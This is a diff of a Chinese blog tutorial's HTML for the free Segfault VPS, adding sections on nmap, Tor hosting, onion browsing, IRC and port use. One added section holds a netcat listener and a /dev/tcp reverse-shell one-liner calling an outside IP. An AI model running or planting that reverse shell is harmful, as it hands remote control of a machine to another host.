@@ -356,17 +356,27 @@
 </li>
 <li><a href="#headline-22">Segfault 提示信息</a>
 </li>
-<li><a href="#headline-23">允许端口转发和代理</a>
+<li><a href="#headline-23">安装任何你喜欢的应用</a>
 </li>
-<li><a href="#headline-24">startfb 教程</a>
+<li><a href="#headline-24">在暗网上发布你的网页</a>
 </li>
-<li><a href="#headline-25">参考链接</a>
+<li><a href="#headline-25">使用暗网</a>
+</li>
+<li><a href="#headline-26">连接 IRCNet</a>
+</li>
+<li><a href="#headline-27">允许端口转发和代理</a>
+</li>
+<li><a href="#headline-28">连接到你自己的公共端口</a>
+</li>
+<li><a href="#headline-29">startfb 教程</a>
+</li>
+<li><a href="#headline-30">参考链接</a>
 </li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#headline-26">SSH 注意事项</a>
+<li><a href="#headline-31">SSH 注意事项</a>
 </li>
 </ul>
 </nav>
@@ -424,7 +434,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 4 分钟
                 </time>
             </div>
         
@@ -814,9 +824,89 @@ Segfault 提示信息
 </div>
 <div id="outline-container-headline-23" class="outline-4">
 <h4 id="headline-23">
-允许端口转发和代理
+安装任何你喜欢的应用
 </h4>
 <div id="outline-text-headline-23" class="outline-text-4">
+<div class="src src-bash">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt install nmap <span class="o">&amp;&amp;</span> nmap -thc</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-24" class="outline-4">
+<h4 id="headline-24">
+在暗网上发布你的网页
+</h4>
+<div id="outline-text-headline-24" class="outline-text-4">
+<div class="src src-bash">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Share files anonymously:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;My First File Shared on The Onion Router (TOR) network&#34;</span> &gt;/onion/helloworld.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Or publish a full webpage (using Markdown syntax):</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Edit your webpage in /sec/www/content/*.md and then publish them:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /sec/www <span class="o">&amp;&amp;</span> make html</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-25" class="outline-4">
+<h4 id="headline-25">
+使用暗网
+</h4>
+<div id="outline-text-headline-25" class="outline-text-4">
+<div class="src src-bash">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">w3m http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/
+</span></span><span class="line"><span class="cl">ssh root@ta6kb6vqm3vd7vlgvf7k4nbhfzst2yfy52t6dqzmz2plteewn7ynmtad.onion</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-26" class="outline-4">
+<h4 id="headline-26">
+连接 IRCNet
+</h4>
+<div id="outline-text-headline-26" class="outline-text-4">
+<div class="src src-bash">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su user -c <span class="s2">&#34;irssi -c ircnet -n MyNickName&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-27" class="outline-4">
+<h4 id="headline-27">
+允许端口转发和代理
+</h4>
+<div id="outline-text-headline-27" class="outline-text-4">
 <div class="src src-bash">
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -835,11 +925,36 @@ Segfault 提示信息
 </div>
 </div>
 </div>
-<div id="outline-container-headline-24" class="outline-4">
-<h4 id="headline-24">
+<div id="outline-container-headline-28" class="outline-4">
+<h4 id="headline-28">
+连接到你自己的公共端口
+</h4>
+<div id="outline-text-headline-28" class="outline-text-4">
+<div class="src src-bash">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On your server:</span>
+</span></span><span class="line"><span class="cl">nc -vnlp <span class="m">34868</span> <span class="c1"># Find your IP &amp; PORT during first log in.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># On another server start a connect back reverse shell to your IP &amp; PORT:</span>
+</span></span><span class="line"><span class="cl">setsid bash -i <span class="p">&amp;</span>&gt;/dev/tcp/185.117.118.23/34868 0&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-29" class="outline-4">
+<h4 id="headline-29">
 startfb 教程
 </h4>
-<div id="outline-text-headline-24" class="outline-text-4">
+<div id="outline-text-headline-29" class="outline-text-4">
 <p>
 使用下面所示的端口转发登录，密码还是 segfault，登录后在vps终端键入 startfb，保持登录状态，然后将浏览器指向 <a href="http://127.0.0.1:2900">http://127.0.0.1:2900</a></p>
 <p>
@@ -882,11 +997,11 @@ startfb 教程
 <img src="/images/segfault_vps教程/png14.png" alt="/images/segfault_vps教程/png14.png" title="/images/segfault_vps教程/png14.png" /></p>
 </div>
 </div>
-<div id="outline-container-headline-25" class="outline-4">
-<h4 id="headline-25">
+<div id="outline-container-headline-30" class="outline-4">
+<h4 id="headline-30">
 参考链接
 </h4>
-<div id="outline-text-headline-25" class="outline-text-4">
+<div id="outline-text-headline-30" class="outline-text-4">
 <p>
 https://www.thc.org/segfault/</p>
 <p>
@@ -897,11 +1012,11 @@ https://www.thc.org/segfault/gui/</p>
 </div>
 </div>
 </div>
-<div id="outline-container-headline-26" class="outline-2">
-<h2 id="headline-26">
+<div id="outline-container-headline-31" class="outline-2">
+<h2 id="headline-31">
 SSH 注意事项
 </h2>
-<div id="outline-text-headline-26" class="outline-text-2">
+<div id="outline-text-headline-31" class="outline-text-2">
 <p>
 首先无论是付费 vps 还是免费 vps，如果需要自己配置 ssh 连接的话一定要注意配置文件里除了默认允许密码登录授权的配置以外还要确认并配置允许 ssh 公钥登录授权，如果 vps 配置这两项都是 yes，那就不需要更改了，其他配置根据自己的需要进行修改</p>
 <p>
